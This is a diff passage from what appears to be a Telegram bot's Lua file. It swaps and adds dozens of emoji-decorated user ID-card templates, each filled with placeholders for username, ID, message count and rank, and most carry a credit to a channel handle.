-• 🖤 | 𝑼𝑺𝑬𝑹 : #username ‌‌‏⚚
-• 🖤 | 𝑺𝑻𝑨 : #stast 🧙🏻‍♂️ ☥
-• 🖤 | 𝑰𝑫 : #id ‌‌‏♕
-• 🖤 | 𝑴𝑺𝑮 : #msgs 𓆊
+🇪🇬≪💎≫ #username • メ
+🇪🇬≪💎≫ #stast  •メ
+🇪🇬≪💎≫ #id  • メ
+🇪🇬≪💎≫ #msgs  •メ
+🇪🇬≪💎≫ #game •メ
+🇪🇬𝗶𝗗 - @DV_POWER1 💞.
 ]],
 [[
-┌ 𝐔𝐒𝐄𝐑 𖤱 #username 𖦴 .
-├ 𝐌𝐒𝐆 𖤱 #msgs 𖦴 .
-├ 𝐒𝐓𝐀 𖤱 #stast 𖦴 .
-└ 𝐈𝐃 𖤱 #id 𖦴 .
+⌯  𝚄𝚂𝙴𝚁 𓄹𓄼 #username
+⌯  𝙸𝙳  𓄹𓄼 #id 
+⌯  𝚂𝚃𝙰 𓄹𓄼 #stast 
+⌯  𝙼𝚂𝙶𝚂𓄹𓄼 #msgs
+⌯  𝗶𝗗 - @DV_POWER1 💞.
 ]],
 [[
-𓄼🇮🇶 𝑼𝒔𝒆𝒓𝑵𝒂𝒎𝒆 : #username 
-𓄼🇮🇶 𝑺𝒕𝒂𝒔𝒕 : #stast 
-𓄼🇮🇶 𝒊𝒅 : #id 
-𓄼🇮🇶 𝑮𝒂𝒎𝒆𝑺 : #game 
-𓄼🇮🇶 𝑴𝒔𝒈𝒔 : #msgs
+𓅓➪:ᗰᔕᘜᔕ : #msgs - ❦ .
+𓅓➪ : Iᗪ : #id - ❦ . 
+𓅓➪ : ᔕTᗩᔕT : #stast - ❦ . 
+𓅓➪ : ᑌᔕᖇᗴᑎᗩᗰᗴ : #username _ ❦ .
+𓅓➪ : 𝗶𝗗 - @DV_POWER1 💞.
 ]],
 [[
-➞: 𝒔𝒕𝒂𓂅 #stast 𓍯➸💞.
-➞: 𝒖𝒔𝒆𝒓𓂅 #username 𓍯➸💞.
-➞: 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯➸💞.
-➞: 𝒊𝒅 𓂅 #id 𓍯➸💞.
+- ايديڪ  ⁞ #id 💘 ٬
+- يوزرڪ القميل ⁞ #username 💘 ٬
+- رسائلڪ  الطيفهہَ ⁞ #msgs 💘 ٬
+- رتبتڪ الحلوه ⁞ #stast  💘٬
+- سحڪاتڪ الفول ⁞ #edit 💘 ٬
+- 𝗶𝗗 - @DV_POWER1 💞.
 ]],
 [[
-☆•𝐮𝐬𝐞𝐫 : #username 𖣬  
-☆•𝐦𝐬𝐠  : #msgs 𖣬 
-☆•𝐬𝐭𝐚 : #stast 𖣬 
-☆•𝐢𝐝  : #id 𖣬
+𓁷⁦⁦ - 𝙪𝙚𝙨 †: #username 𓀀 .
+𓁷 - 𝙢𝙨𝙜 † : #msgs 𓀀 .
+𓁷 - 𝙨𝙩𝙖 †: #stast 𓀀  .
+𓁷 - 𝙞𝙙 †: #id 𓀀 .
+𓁷 - 𝗶𝗗 - @DV_POWER1 💞.
+]],
+[[
+𖡋 𝐔𝐒𝐄 ⌯ #username 
+𖡋 𝐌𝐒𝐆 ⌯ #msgs 
+𖡋 𝐒𝐓𝐀 ⌯ #stast 
+𖡋 𝐈𝐃 ⌯ #id 
+𖡋 𝐄𝐃𝐈𝐓 ⌯ #edit
+𖡋 𝗶𝗗 - @DV_POWER1 🦅.
+]],
+[[
+𖤂 ~ 𝑢𝑠𝑒 #username  𖤐
+𖤂 ~ 𝑚𝑠𝑔 #msgs 𖤐
+𖤂 ~ 𝑠𝑡𝑎 #stast  
+𖤂 ~ 𝑖𝑑 #id 𖤐
+𖤂 ~ 𝑒𝑑𝑖𝑡 #edit 𖤐
+𖤂 ~ 𝗶𝗗 - @DV_POWER1 🦅.
+]],
+[[
+••• ••• ••• ••• ••• ••• ••• 
+࿕ ¦• 𝙐𝙎𝙀𝙍  ⟿ #username ༆
+ ࿕ ¦• 𝙈𝙎𝙂𝙎   ⟿ #msgs ༆
+ ࿕ ¦• 𝙂𝙈𝘼𝙎  ⟿ #stast ༆
+ ࿕ ¦• 𝙏𝘿 𝙎𝙏𝘼  ⟿ #id ༆
+••• ••• ••• ••• ••• ••• •••
+ ࿕ ¦• 𝗶𝗗 - @DV_POWER1 🦅.
+]],
+[[
+► 𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘 #username 𓃚  ꙰
+► 𝗜𝗗 #id 𓃚 ꙰
+► 𝗦𝗧𝗔𝗦 #stast 𓃚 ꙰
+► 𝗠𝗦𝗔𝗚 #msgs 𓃚 ꙰
+► 𝗶𝗗 - @DV_POWER1 🦅.
+]],
+[[
+-›   𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 . #username 🇪🇬 ꙰ 
+-›   𝚂𝚃𝙰𝚂𝚃 . #stast 🇪🇬 ꙰
+-›   𝙸𝙳 . #id 🇪🇬 ꙰ 
+-›   𝙶𝙼𝙰𝚂 . #stast 🇪🇬 ꙰ 
+-›   𝙼𝚂𝙶𝚂 . #msgs 🇪🇬 ꙰
+-›   𝗶𝗗 - @DV_POWER1 🇪🇬 ꙰.
+]],
+[[
+- UsEr🇪🇬 ꙰ #username
+- StA🇪🇬 ꙰   #msgs
+- MsGs🇪🇬 ꙰ #stast
+- ID🇪🇬 ꙰  #id
+- 𝗶𝗗 🇪🇬 ꙰  @DV_POWER1 💞.
+]],
+[[
+┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
+🇪🇬 - 𝚄𝚂𝙴𝚁 ⟿ #username 💘.
+🇪🇬 - 𝙼𝚂𝙶𝚂 ⟿  #msgs 💘.
+🇪🇬 - 𝙶𝙼𝙰𝚂 ⟿ #stast 💘.
+🇪🇬 - 𝙸𝙳 𝚂𝚃𝙰 ⟿ #id 💘.  
+┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
+🇪🇬 - 𝗶𝗗 - @DV_POWER1 🦅.
 ]],
 [[
 - 𓏬 𝐔𝐬𝐄𝐫 : #username 𓂅 .
 - 𓏬 𝐌𝐬𝐆  : #msgs 𓂅 .
 - 𓏬 𝐒𝐭𝐀 : #stast 𓂅 .
 - 𓏬 𝐈𝐃 : #id 𓂅 .
+- 𓏬 𝗶𝗗 - @DV_POWER1 🦅.
 ]],
 [[
-.𖣂 𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 , #username  
-.𖣂 𝙨𝙩𝙖𝙨𝙩 , #stast  
-.𖣂 𝙡𝘿 , #id  
-.𖣂 𝙂𝙖𝙢𝙨 , #game 
-.𖣂 𝙢𝙨𝙂𝙨 , #msgs
+ᯓ 𝟔𝟔𝟔 𖡋 #username •✟
+ᯓ 𝟔𝟔𝟔𖡋 #stast  •✟
+ᯓ 𝟔𝟔𝟔𖡋 #id  • ✟
+ᯓ 𝟔𝟔𝟔𖡋 #msgs  •✟ 
+ᯓ 𝟔𝟔𝟔𖡋 #game •✟
+ᯓ 𝟔𝟔𝟔𖡋 𝗶𝗗 - @DV_POWER1 🦅.
 ]],
 [[
-❅∫ 𝐔𝐒𝐄𝐑 ↬ #username 
-❅∫ 𝐈𝐃 ↬ #id
-❅∫ 𝐒𝐓𝐀𝐒𝐓 ↬ #stast
-❅∫ 𝐀𝐔𝐓𝐎 ↬ #cont 
-❅∫ 𝐌𝐀𝐒𝐆 ↬ #msgs
-❅∫ 𝐆𝐀𝐌𝐄 ↬ #game
+🦅•𝐮𝐬𝐞𝐫 : #username 𖣬  
+🦅•𝐦𝐬𝐠  : #msgs 𖣬 
+🦅•𝐬𝐭𝐚 : #stast 𖣬 
+🦅•𝐢𝐝  : #id 𖣬
+🦅•𝗶𝗗 - @DV_POWER1 🦅.
 ]],
 [[
-ᯓ 𝗨𝗦𝗘𝗥𝗡𝗮𝗺𝗘 . #username 🇺🇸 ꙰
-ᯓ 𝗦𝗧𝗮𝗦𝗧 . #stast 🇺🇸 ꙰
-ᯓ 𝗜𝗗 . #id 🇺🇸 ꙰
-ᯓ 𝗚𝗮𝗺𝗘𝗦 . #game 🇺🇸 ꙰
-ᯓ 𝗺𝗦𝗚𝗦 . #msgs 🇺🇸 ꙰
+- ᴜѕᴇʀɴᴀᴍᴇ ➣ #username .
+- ᴍѕɢѕ ➣ #msgs .
+- ѕᴛᴀᴛѕ ➣ #stast .
+- ʏᴏᴜʀ ɪᴅ ➣ #id  .
+- 𝗶𝗗 - @DV_POWER1 🦅.
+]],
+[[
+- ᴜѕʀ: #username ঌ.
+- ᴍѕɢ: #msgs  ঌ.
+- ѕᴛᴀ: #stast  ঌ.
+- ɪᴅ: #id ঌ.
+- 𝗶𝗗 - @DV_POWER1 🦅.
+]],
+[[
+- 𝑢𝑠𝑒𝑟𝑛𝑎𝑚𝑒 ⟿ #username
+- 𝑚𝑠𝑔𝑠 ⟿ #msgs
+- 𝑖𝑑 ⟿ #id
+- 𝑒𝑑𝑖𝑡 ⟿ #edit
+- 𝑔𝑎𝑚𝑒 ⟿ #game
+- 𝗶𝗗 - @DV_POWER1 🦅.
+]],
+[[
+⌔➺: Msgs : #msgs - 🔹.
+⌔➺: ID : #id - 🔹.
+⌔➺: Stast : #stast -🔹.
+⌔➺: UserName : #username -🔹.
+⌔➺: 𝗶𝗗 - @DV_POWER1 🦅.
+]],
+[[
+┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
+🇪🇬 ꙰  - 𝚞 𝚜𝚎 𝚛 ➟ #username  ❃.
+🇪🇬 ꙰  - 𝚖 𝚜𝚐 𝚜 ➟ #msgs ❃.
+🇪🇬 ꙰  - 𝚐 𝚖 𝚊𝚜  ➟ #stast ❃.
+🇪🇬 ꙰  - 𝙸𝙳 𝚜𝚝𝚊   ➟ #id ❃.
+┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
+🇪🇬 ꙰  - 𝗶𝗗 - @DV_POWER1 🦅.
+]],
+[[
+🌯 ¦✙• 𝒖𝒔𝒆𝒓𝒏𝒂𝒎𝒆 ➢ ⁞  #username 🇪🇬
+🌯 ¦✙• 𝒎𝒔𝒈𝒔 ➢ ⁞  #msgs  📝
+🌯 ¦✙• 𝒓𝒂𝒏𝒌 ➢ ⁞ #stast  
+🌯 ¦✙• 𝒊𝒅 𝒔𝒕𝒂 ➢ ⁞ #id  🆔
+🌯 ¦ 𝗶𝗗 - @DV_POWER1 🦅.
+]],
+[[
+¦• 𝚄𝚂𝙴𝚁  ⇉⁞ #username ↝🇪🇬.
+¦• 𝙼𝚂𝙶𝚂 ⇉ ⁞  #msgs  ↝ 🇪🇬.
+¦• 𝚁𝙰𝙽𝙺  ⇉⁞ #stast  ↝🇪🇬.
+¦• 𝙸𝙳 𝚂𝚃𝙰 ⇉ #id  ↝🇪🇬.
+¦• 𝗶𝗗 - @DV_POWER1 🦅.
+]],
+[[
+➞: 𝒔𝒕𝒂𓂅 #stast 𓍯➸💞.
+➞: 𝒖𝒔𝒆𝒓𓂅 #username 𓍯➸💞.
+➞: 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯➸💞.
+➞: 𝒊𝒅 𓂅 #id 𓍯➸💞.
+➞: 𝗶𝗗 - @DV_POWER1 💞.
+]],
+[[
+➼ : 𝐼𝐷 𖠀 #id . ♡
+➼ : 𝑈𝑆𝐸𝑅 𖠀 #username .♡
+➼ : 𝑀𝑆𝐺𝑆 𖠀 #msgs .♡
+➼ : 𝑆𝑇𝐴S𝑇 𖠀 #stast .♡ 
+➼ : 𝐸𝐷𝐼𝑇  𖠀 #edit .♡
+➼ : 𝗶𝗗 - @DV_POWER1 🦅.
+]],
+[[
+▽ ¦❀• USER ➭ ⁞ #username .
+▽ ¦❀• 𝙼𝚂𝙶𝚂 ➬ ⁞  #msgs  .
+▽ ¦❀• STAT ➬ ⁞ #stast  .
+▽ ¦❀• 𝙸𝙳  ➬ ⁞ #id  .
+▽ ¦❀• 𝗶𝗗 - @DV_POWER1 🦅.
+]],
+[[
+• ❉ 𝑼𝑬𝑺 : #username ‌‌‏.
+• ❉ 𝑺𝑻𝑨 : #stast .
+• ❉ 𝑰𝑫 : #id  ‌‌‏.
+• ❉  𝑴𝑺𝑮 : #msgs 𓆊.
+• ❉ 𝑾𝒆𝒍𝒄𝒐𝒎𝒆  ⁞ .
+• ❉ 𝗶𝗗 - @DV_POWER1 🦅.
+]],
+[[
+⌯ |USERNAME #username 𓃚
+⌯ | YOUR -ID - #id 𓃚
+⌯ | STAS-#stast 𓃚
+ ⌯| MSAG - #msgs 𓃚
+ ⌯| 𝗶𝗗 - @DV_POWER1 🦅.
+]],
+[[
+𝟔𝟔𝟔 𖡋 #username • 𖣰💞
+𝟔𝟔𝟔 𖡋  #stast •𖣰💞
+𝟔𝟔𝟔 𖡋 #id • 𖣰💞
+𝟔𝟔𝟔 𖡋 #game • 𖣰💞
+𝟔𝟔𝟔 𖡋 #msgs • 𖣰💞
+𝟔𝟔𝟔 𖡋 𝗶𝗗 - @DV_POWER1 🦅.
+]],
+[[
+⌔➺: Msgs : #msgs - 🔹.
+⌔➺: ID : #id - 🔹.
+⌔➺: Stast : #stast -🔹.
+⌔➺: UserName : #username -🔹.
+⌔➺: 𝗶𝗗 - @DV_POWER1 🦅.
+]],
+[[
+🦅 - 𝓾𝓼𝓮𝓻 ➪ #username 🦅.
+🦅 - 𝓼𝓽𝓪𝓼𝓽  ➪ #stast 🦅.
+🦅 - 𝓲𝓭 ➪ #id ⸙🦅.
+🦅 - 𝓰𝓶𝓪𝓼 ➪ #gmas ⸙🦅.
+🦅 - 𝓶𝓼𝓰𝓼 ➪ #msgs 🦅.
+🦅 - 𝗶𝗗 - @DV_POWER1 🦅.
+]],
+[[
+- 𝄬 username . #username ➪🇪🇬
+ - 𝄬 stast . #stast ➪🇪🇬
+ - 𝄬 id . #id ➪🇪🇬
+ - 𝄬 msgs . #msgs ➪🇪🇬
+ - 𝄬 𝗶𝗗 - @DV_POWER1 🦅.
+]],
+[[
+◣: 𝒔𝒕𝒂𓂅 #stast 𓍯➥♡.
+◣: 𝒖𝒔𝒆𝒓𓂅 #username 𓍯➥♡.
+◣: 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯➥♡.
+◣: 𝒊𝒅 𓂅 #id 𓍯➥♡.
+◣: 𝗶𝗗 - @DV_POWER1 🦅.
+]],
+[[
+↣• USE ➤ #username  ↝🍬.
+↣• MSG ➤  #msgs  ↝🍬.
+↣• STA ➤  #stast  ↝🍬.
+↣• iD ➤ #id  ↝🍬.
+↣• 𝗶𝗗 - @DV_POWER1 🦅.
+]],
+[[
+➫✿: S #stast 𓍯➟♡.
+➫✿: U𓂅 #username 𓍯➟♡.
+➫✿: M𓂅 #msgs 𓍯➟♡.
+➫✿:  I  #id ➟♡.
+➫✿: 𝗶𝗗 - @DV_POWER1 🦅.
+]],
+[[
+✶- 𝒔𝒕𝒂𓂅 #stast 𓍯↝❃ .
+✶- 𝒖𝒔𝒆𝒓𓂅 #username 𓍯↝❃.
+✶- 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯↝❃.
+✶- 𝒊𝒅 𓂅 #id 𓍯↝❃.
+✶- 𝗶𝗗 - @DV_POWER1 🦅.
+]],
+[[
+• 🖤 | 𝑼𝑬𝑺 :  #username
+
+• 🖤 | 𝑺𝑻𝑨 : #stast
+
+• 🖤 | 𝑰𝑫 :  #id
+
+• 🖤 | 𝑴𝑺𝑮 : #msgs
+
+• 🖤 | 𝗶𝗗 - @DV_POWER1 🦅.
+]],
+[[
+• USE 𖦹 #username 
+• MSG 𖥳 #msgs  
+• STA 𖦹 #stast 
+• iD 𖥳 #id
+• 𝗖𝗛 - @DV_POWER1 💞.
+]],
+[[
+- ᴜѕᴇʀɴᴀᴍᴇ ➣ #username .
+- ᴍѕɢѕ ➣ #msgs .
+- ѕᴛᴀᴛѕ ➣ #stast .
+- ʏᴏᴜʀ ɪᴅ ➣ #id  .
+- ᴇᴅɪᴛ ᴍsɢ ➣ #edit .
+- ᴅᴇᴛᴀɪʟs ➣ #auto . 
+-  ɢᴀᴍᴇ ➣ #game .
+- 𝗖𝗛 - @DV_POWER1 💞.
+]],
+[[
+⚕𝙐𝙎𝙀𝙍𝙉𝘼𝙈𝙀 : #username
+⚕𝙈𝙀𝙎𝙎𝘼𝙂𝙀𝙎 : #msgs
+⚕𝙎𝙏𝘼𝙏𝙎 : #stast
+⚕𝙄𝘿 : #id
+⚕𝙅𝙀𝙒𝙀𝙇𝙎 : #game
+⚕𝘿𝙀𝙑 : #ridha
+⚕𝗖𝗛 - @DV_POWER1 💞.
+]],
+[[
+• 🦄 | 𝑼𝑬𝑺 : #username ‌‌‏⚚
+• 🦄 | 𝑺𝑻𝑨 : #stast ☥
+• 🦄 | 𝑰𝑫 : #id ‌‌‏♕
+• 🦄 | 𝑴𝑺𝑮 : #msgs 𓆊
+• 🦄 | 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 : ⁞
+• 🦄 | 𝗖𝗛 - @DV_POWER1 💞.
+]],
+[[
+• △ | 𝑼𝑬𝑺 : #username ‌‌‏⚚
+• ▽ | 𝑺𝑻𝑨 : #stast ☥
+• ⊠ | 𝑰𝑫 : #id ‌‌‏♕
+• ❏ | 𝑴𝑺𝑮 : #msgs 𓆊
+• ❏ | 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 :
+• ❏ | 𝗖𝗛 - @DV_POWER1 💞.
+]],
+[[
+︙iD ➺ #id 💘
+︙UsEr ➺ #username 💕
+︙MsG ➺ #msgs 🧸 
+︙StAtE ➺ #stast 🎀
+︙EdIT ➺ #edit  💒
+︙𝗖𝗛 - @DV_POWER1 🦅.
+]],
+[[
+⚕ 𓆰 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝑻𝒐 ★
+• 🖤 | 𝑼𝑬𝑺 : #username ‌‌‏⚚
+• 🖤 | 𝑺𝑻𝑨 : #stast 🧙🏻‍♂ ☥
+• 🖤 | 𝑰𝑫 : #id ‌‌‏♕
+• 🖤 | 𝑴𝑺𝑮 : #msgs 𓆊
+• 🖤 | 𝗖𝗛 - @DV_POWER1 🦅.
+]],
+[[
+┄─━━◉━━─┄
+𖣤 ᴜѕᴇʀɴᴀᴍᴇ 𓄹𓄼 #id 🇪🇬
+𖦼 ʏᴏᴜʀ ɪᴅ 𓄹𓄼 #username  💛
+𖥪 ᴍѕɢѕ 𓄹𓄼 #msgs ✉️
+𖥧 ѕᴛᴀᴛѕ 𓄹𓄼 #stast 👩🏿‍🚒 
+𖥣 ᴇᴅɪᴛ 𓄹𓄼 #game🙇🏿‍♀💕
+✰ ᴄʜ ᴇʟɪɴ ➣ #edit
+┄─━━◉━━─┄
+✰ 𝗖𝗛 - @DV_POWER1 🦅.
+]],
+[[
+𓄼 ᴜѕᴇ : #username ♕
+𓄼 ѕᴛᴀ : #stast ☥
+𓄼 ɪᴅ : #id ‌‌‏⚚
+𓄼 ᴍѕɢ : #msgs 𓆊
+𓄼 𝗖𝗛 - @DV_POWER1 💞.
+]],
+[[
+• ﮼ايديك  #id 🌻 ٬
+• ﮼يوزرك ➺ #username 🌻 ٬
+• ﮼مسجاتك ➺ #msgs 🌻 ٬
+•  ﮼رتبتك➺ #stast 🌻 ٬
+• ﮼تعديلك ➺ #edit 🌻 ٬
+• ﮼ تعين ➺ @DV_POWER1 💞.
+]],
+[[
+‎⿻┊Yor iD 𖠄 #id ٫
+‌‎⿻┊UsEr 𖠄 #username ٫
+‌‎⿻┊MsGs 𖠄 #msgs ٫
+‌‎⿻┊StAtS 𖠄 #stast ٫
+‌‎⿻┊‌‎EdiT 𖠄 #edit ٫
+‌‎⿻┊‌‎𝗖𝗛 - @DV_POWER1 💞.
+]],
+[[
+⌾ | 𝒊𝒅  𓃠 #id .
+⌾ | 𝒖𝒔𝒆𝒓 𓃠 #username .
+⌾ | 𝒎𝒔𝒈𝒔 𓃠 #msgs .
+⌾ | 𝒔𝒕𝒂𝒕𝒔 𓃠 #stast .
+⌾ | 𝒆𝒅𝒊𝒕 𓃠 #edit .
+⌾ | 𝗖𝗛 - @DV_POWER1 💞.
+]],
+[[
+♡ : 𝐼𝐷 𖠀 #id .
+♡ : 𝑈𝑆𝐸𝑅 𖠀 #username .
+♡ : 𝑀𝑆𝐺𝑆 𖠀 #msgs .
+♡ : 𝑆𝑇𝐴𝑇𝑆 𖠀 #stast .
+♡ : 𝐸𝐷𝐼𝑇  𖠀 #edit .
+♡ : 𝗖𝗛 - @DV_POWER1 💞.
+]],
+[[
+•ᑌᔕᗴᖇ- #username 
+•ᔕTᗩ- #stast 
+•ᗰᔕ- #msgs 
+•Iᗪ- #id
+•𝗖𝗛 - @DV_POWER1 💞.
+]],
+[[
+• USE ➤ #username  .
+• MSG ➤  #msgs  .
+• STA ➤  #stast  .
+• iD ➤ #id  .
+• 𝗖𝗛 - @DV_POWER1 💞.
+]],
+[[
+𝐘𝐨𝐮𝐫 𝐈𝐃 ☤🇪🇬- #id 
+𝐔𝐬𝐞𝐫𝐍𝐚☤🇪🇬- #username 
+𝐒𝐭𝐚𝐬𝐓 ☤🇪🇬- #stast 
+𝐌𝐬𝐠𝐒☤🇪🇬 - #msgs
+𝗖𝗛☤🇪🇬 - @DV_POWER1 🦅.
+]],
+[[
+⭐️𝖘𝖙𝖆 : #stast ـ🍭
+⭐️𝖚𝖘𝖊𝖗𝖓𝖆𝖒𝖊 : #username ـ🍭
+⭐️𝖒𝖘𝖌𝖘 : #msgs ـ🍭
+⭐️𝖎𝖉 : #id ـ 🍭
+⭐️𝗖𝗛 - @DV_POWER1 💞.
+]],
+[[
+• 🇪🇬 - 𝚄𝚂𝙴𝚁 « #username  🍭
+• 🇪🇬 - 𝙸𝙳 « #id  🍭
+• 🇪🇬 - 𝙼𝚂𝙶𝚂 « #msgs  🍭
+• 🇪🇬 - 𝚂𝚃𝙰𝚂𝚃 « #stast  🍭
+• 🇪🇬 - 𝗖𝗛 - @DV_POWER1 🦅.
+]],
+[[
+• USE ➤  #username .
+• MSG ➤  #msgs .
+• STA ➤  #stast .
+• iD ➤ #id .
+• 𝗶𝗗 - @DV_POWER1 💞.
+]],
+[[
+🇪🇬 - 𝄬 𝐔ˢᴱᴿᴺᴬᴹᴱ . #username  𓃠
+🇪🇬 - 𝄬 ˢᵀᴬˢᵀ . #stast  𓃠
+🇪🇬 - 𝄬 ᴵᴰ . #id 𓃠
+🇪🇬 - 𝄬 ᴳᴹᴬˢ . #gmas 𓃠
+🇪🇬 - 𝄬 ᴹˢᴳˢ . #msgs  𓃠
+🇪🇬 - 𝄬 𝗶𝗗 - @DV_POWER1 🦅.
+]],
+[[
+𓄼🇪🇬 𝑼𝒔𝒆𝒓𝑵𝒂𝒎𝒆 : #username ♕
+𓄼🇪🇬 𝑺𝒕𝒂𝒔𝒕 : #stast    ☥
+𓄼🇪🇬 𝒊𝒅 : #id ‌‌‏⚚
+𓄼🇪🇬 𝑮𝒂𝒎𝒆𝑺 : #edit ⚚
+𓄼🇪🇬 𝑴𝒔𝒈𝒔 : #msgs 𓆊
+𓄼🇪🇬 𝗖𝗛 - @DV_POWER1 🦅.
+]],
+[[
+Usᴇʀ Nᴀᴍᴇ ~ #username 
+Yᴏᴜʀ ɪᴅ ~ #id 
+Sᴛᴀsᴛ ~ #stast 
+Msᴀɢ ~ #msgs
+𝗖𝗛 - @DV_POWER1 💞.
+]],
+[[
+- 🇪🇬 UsErNaMe . #username 𖠲
+- 🇪🇬 StAsT . #stast 𖠲
+- 🇪🇬 Id . #id 𖠲
+- 🇪🇬 GaMeS . #game 𖠲
+- 🇪🇬 MsGs . #msgs 𖠲
+- 🇪🇬 𝗖𝗛 - @DV_POWER1 🦅.
+]],
+[[
+🇪🇬 - 𝄬 username . #username  𓃠
+🇪🇬 - 𝄬 stast . #stast  𓃠
+🇪🇬 - 𝄬 id . #id 𓃠
+🇪🇬 - 𝄬 gmas . #gmas 𓃠
+🇪🇬 - 𝄬 msgs . #msgs  𓃠
+🇪🇬 - 𝄬 𝗶𝗗 - @DV_POWER1 💞.
+]],
+[[
+金 - 𝓾𝓼𝓮𝓻𝓷𝓪𝓶𝓮 . #username ⸙ 
+金 - 𝓼𝓽𝓪𝓼𝓽  . #stast ⸙ 
+金 - 𝓲𝓭 . #id ⸙ 
+金 - 𝓰𝓶𝓪𝓼 . #gmas ⸙ 
+金 - 𝓶𝓼𝓰𝓼 . #msgs ⸙
+金 - 𝗶𝗗 - @DV_POWER1 💞.
+]],
+[[
+➜𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘 : #username
+➜𝗠𝗘𝗦𝗦𝗔𝗚𝗘𝗦 : #msgs
+➜𝗦𝗧𝗔𝗧𝗦 : #stast
+➜𝗜𝗗 : #id
+➜𝗶𝗗 - @DV_POWER1 💞.
+]],
+[[
+⌔︙Msgs : #msgs.
+⌔︙ID : #id.
+⌔︙Stast : #stast.
+⌔︙UserName : #username.
+⌔︙𝗶𝗗 - @DV_POWER1 💞.
+]],
+[[
+𝒔𝒕𝒂𓂅 #stast 𓍯
+𝒖𝒔𝒆𝒓𓂅 #username 𓍯
+𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯
+𝒊𝒅 𓂅 #id 𓍯
+𓂅 𝗶𝗗 - @DV_POWER1 💞.
+]],
+[[
+- 🇪🇬 𝒖𝒔𝒆𝒓𝒏𝒂𝒎𝒆 . #username 𖣂.
+- 🇪🇬 𝒔𝒕𝒂𝒔𝒕 . #stast 𖣂.
+- 🇪🇬 𝒊𝒅 . #id 𖣂.
+- 🇪🇬 𝒈𝒂𝒎𝒆𝒔 . #game 𖣂.
+- 🇪🇬 𝒎𝒔𝒈𝒔 . #msgs 𖣂.
+- 🇪🇬 𝗖𝗛 - @DV_POWER1 🦅.
+]],
+[[
+ᯓ 𝗨𝗦𝗘𝗥𝗡𝗮𝗺𝗘 . #username 🇪🇬 ꙰
+ᯓ 𝗦𝗧𝗮𝗦𝗧 . #stast 🇪🇬 ꙰
+ᯓ 𝗜𝗗 . #id 🇪🇬 ꙰
+ᯓ 𝗚𝗮𝗺𝗘𝗦 . #game 🇪🇬 ꙰
+ᯓ 𝗺𝗦𝗚𝗦 . #msgs 🇪🇬 ꙰
+ᯓ 𝗶𝗗 - @DV_POWER1 🦅.
+]],
+[[
+.𖣂 𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 , #username  🖤 ↴
+.𖣂 𝙨𝙩𝙖𝙨𝙩 , #stast  🖤 ↴
+.𖣂 𝙡𝘿 , #id  🖤 ↴
+.𖣂 𝘼𝙪𝙩𝙤 , #auto  🖤 ↴
+.𖣂 𝙢𝙨𝙂𝙨 , #msgs  🖤 ↴
+.𖣂 𝗶𝗗 - @DV_POWER1 💞.
+]],
+[[
+➥• USE 𖦹 #username - 🇪🇬.
+➥• MSG 𖥳 #msgs  - 🇪🇬.
+➥• STA 𖦹 #stast - 🇪🇬.
+➥• iD 𖥳 #id - 🇪🇬.
+➥• 𝗶𝗗 - @DV_POWER1 🦅.
+]],
+[[
+👳🏼‍♂ - 𝄬 username . #username . 🇪🇬
+👳🏼‍♂ - 𝄬 stast . #stast . 🇪🇬
+👳🏼‍♂ - 𝄬 id . #id . 🇪🇬
+👳🏼‍♂ - 𝄬 auto . #auto . 🇪🇬
+👳🏼‍♂ - 𝄬 msgs . #msgs . 🇪🇬
+👳🏼‍♂ - 𝄬 𝗶𝗗 - @DV_POWER1 🦅.
+]],
+[[
+➭- 𝒔𝒕𝒂𓂅 #stast 𓍯. 💕
+➮- 𝒖𝒔𝒆𝒓𓂅 #username 𓍯. 💕
+➭- 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯. 💕
+➭- 𝒊𝒅 𓂅 #id 𓍯. 💕
+➭- 𝗶𝗗 - @DV_POWER1 💞.
+]],
+[[
+𓄼 ᴜѕᴇ : #username ♕
+𓄼 ѕᴛᴀ : #stast  ☥
+𓄼 ɪᴅ : #id ‌‌‏⚚
+𓄼 ᴍѕɢ : #msgs 𓆊 
+𓐀 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𓀃.
+𓄼 𝗶𝗗 - @DV_POWER1 🦅.
+]],
+[[
+𝐓𝐓• 𝐘𝐎𝐔𝐑 𝐈𝐃 𖠰 #id .
+𝐓𝐓• 𝐌𝐒𝐆𝐒 𖠰 #msgs .
+𝐓𝐓• 𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄 𖠰 #username .
+𝐓𝐓• 𝐒𝐓𝐀𝐒𝐓 𖠰 #stast .
+𝐓𝐓• 𝐀𝐔𝐓𝐎 𖠰 #auto .
+𝐓𝐓• 𝗘𝗗𝗜𝗧 𖠰 #edit .
+𝐓𝐓• 𝗶𝗗 - @DV_POWER1 🦅.
+]],
+[[
+𝟓 𝟔 𖡻 #username  ࿇🦄
+𝟓 𝟔 𖡻 #msgs  ࿇🦄
+𝟓 𝟔 𖡻 #auto  ࿇🦄
+𝟓 𝟔 𖡻 #stast  ࿇🦄
+𝟓 𝟔 𖡻 #id  ࿇🦄
+𝟓 𝟔 𖡻 𝗶𝗗 - @DV_POWER1 💞.
+]],
+[[
+༻┉𖦹┉┉𖦹┉┉𖦹┉┉𖦹┉༺
+• |𝗜𝗗  ⁞ #id
+• |𝗨𝗦𝗘 ⁞ #username
+• |𝗦𝗧𝗔  ⁞ #stast
+• |𝗠𝗦𝗚  ⁞ #edit
+• |𝗔𝗨𝗧𝗢 ⁞ #auto
+—————————————
+𝗖𝗛 - @DV_POWER1 🦅.
+]],
+[[
+┄─━━◉━━─┄
+𖣰𖡻 𖡋𝗜𝗗• #id •𓀎
+𖣰𖡻 𖡋𝗨𝗦𝗘• #username •𓀎
